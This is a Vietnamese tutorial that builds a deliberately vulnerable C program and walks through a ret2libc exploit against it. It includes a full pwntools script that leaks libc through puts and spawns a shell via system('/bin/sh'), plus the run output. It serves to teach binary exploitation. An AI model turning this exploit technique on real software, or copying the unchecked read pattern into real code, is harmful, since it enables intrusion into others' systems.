# ret2libc_chall_demo_file

* Chúng ta sẽ xây dựng một chương trình đơn giản, sử dụng hàm read để gây lỗi tràn bộ đệm, và dùng puts để in ra một giá trị từ GOT (trong trường hợp này, chúng ta có thể leak địa chỉ của puts).

*Code chương trình C (ret2libc.c):*
```C
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main() {
    char buffer[64];
    setbuf(stdout, NULL);
    puts("Nhap: ");
    read(0, buffer, 256);
    return 0;
}
```
* Biên dịch chương trình để tạo file challenge, vì ret2libc là kỹ thuật vượt NX, vậy ta sẽ tắt các cơ chế bảo vệ khác trừ NX:
```bash
 gcc -fno-stack-protector -no-pie ret2libc.c -o chall3
 ```

 # Tiến hành khai thác
 ## Phân tích mã giả bằng IDA64 
 (Mặc dù đã phát hiện lỗ hổng từ chương trình C nhưng vẫn đưa bước này vào để khái quát tuần tự quá trình khai thác)
 ```bash
 ida64 chall3
 ```
 * Pseudo code
 ```
 int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  setbuf(_bss_start, 0LL);
  puts("Nhap: ");
  read(0, buf, 256uLL);
  return 0;
}
```
**Tại sao lại dùng ret2libc?**
* Có lỗi buffer overflow xảy ra
* NX enabled : không thế thực thi shellcode trên stack
* Không có hàm nào khác để lợi dụng mở shell
* Có thư viện libc
=> Lợi dụng một hàm trong chương trình để leak địa chỉ libc_base địa chỉ libc để tạo shell
**GOT & PLT**
* GOT là một bảng chứa các địa chỉ của các hàm trong thư viện
* PLT: chứa mã (code) để gọi đến hàm thông qua GOT
## Tìm offset để ghi đè return address
**Debug bằng gdb với công cụ pwndbg:**
* Chạy chương trình với input gây buffer overflow và kiểm tra giá trị save rip:
```bash
pwndbg> cyclic -l 0x616161616161616a
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
```

## Scipt khai thác
### Leak libc_address ( Lần gửi payload đầu tiên )
1. Tìm địa chỉ của gadget `pop rdi ; ret`
```bash
ROPgadget --binary chall3 | grep "pop rdi"
0x0000000000401146 : pop rdi ; ret
```
```python
pop_rdi = 0x0000000000401146
```
2. Đặt vào RDI địa chỉ GOT của hàm `puts`.
```python
payload = b'A' * 72
payload += p64(pop_rdi) + p64(exe.got['puts'])
```
3. Gọi `puts@plt` để in địa chỉ thực của hàm đó trong libc.
```python
payload += p64(exe.plt['puts'])
```
4. Quay lại hàm main (hoặc một địa điểm nào đó) để thực hiện lần overflow thứ hai.
```python
payload += p64(exe.sym['main'])
```
* Gửi payload
```python
p.sendafter(b'Nhap: \n', payload)
```

5. Tính toán địa chỉ base của libc
```python
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - libc.sym['puts']
log.info("Libc leak: " + hex(libc_leak))      # In ra để kiểm tra
log.info("Libc base: " + hex(libc.address))
```

### Giải thích chi tiết:
#### 1. **Cấu trúc của libc**
- Libc là một thư viện chia sẻ (shared library) chứa các hàm C cơ bản (như `puts`, `printf`, `system`, ...).
- Khi chương trình được nạp vào bộ nhớ, toàn bộ libc được ánh xạ vào một vùng nhớ ảo. Địa chỉ bắt đầu của vùng nhớ này gọi là **libc base address**.
- Mỗi hàm trong libc có một **offset cố định** so với libc base. Offset này không bao giờ thay đổi (với cùng một bản libc).
#### 2. **Công thức tính toán**
```
libc_base = leaked_address - offset_của_hàm_trong_libc
```
- `leaked_address`: địa chỉ thực tế của hàm (ví dụ `puts`) trong bộ nhớ tại thời điểm chạy.
- `offset_của_hàm_trong_libc`: vị trí tương đối của hàm đó so với libc base. Giá trị này được lấy từ file libc (bằng cách dùng `libc.sym['puts']` trong pwntools).
- Khi giải CTF trên server ta cần patch file binary với file libc đúng ( Thử với libc tìm được trên [libc.rip](https://libc.rip/)) bằng công cụ pwninit.
### Lấy shell ( Lần gửi payload tiếp theo )
**Mục tiêu là gọi `system("/bin/sh")`.**
```python
payload = b'A' * 72
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])
p.sendafter(b'Nhap: \n', payload)
p.interactive()
```
* Chúng ta cũng cần đảm bảo rằng chương trình không gặp lỗi. Nếu có vấn đề về stack alignment ( lỗi căn chỉnh stack ), có thể thêm một gadget `ret` trước khi gọi `system`:
```python
ret = 0x0000000000401016
payload = b'A' * 72
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(ret)
payload += p64(libc.sym['system'])
p.sendafter(b'Nhap: \n', payload)
p.interactive()
```
### Script hoàn chỉnh ( solve3.py )
```python
#!/usr/bin/python3

from pwn import *

exe = ELF('./chall3',checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)

context.binary = exe
p = process(exe.path)

pop_rdi = 0x0000000000401146

# PAYLOAD

### LEAK LIBC ADDRESS ###
payload = b'A' * 72
payload += p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
p.sendafter(b'Nhap: \n', payload)
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - libc.sym['puts']
log.info("Libc leak: " + hex(libc_leak))
log.info("Libc base: " + hex(libc.address))

ret = 0x0000000000401016
### GET SHELL ###
payload = b'A' * 72
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(ret)
payload += p64(libc.sym['system'])
p.sendafter(b'Nhap: \n', payload)

p.interactive()
```
### Chạy thử
```
 ./solve3.py
[+] Starting local process '/mnt/c/Users/ASUS/Downloads/chall3': pid 510962
[*] Libc leak: 0x7fd3eb05a5a0
[*] Libc base: 0x7fd3eafda000
[*] Switching to interactive mode
$ ls
 chall3
 Flag.txt
$ cat Flag.txt
WELL DONE! THIS IS YOUR FLAG: CTF{ISP_VO_DICH}
$
```









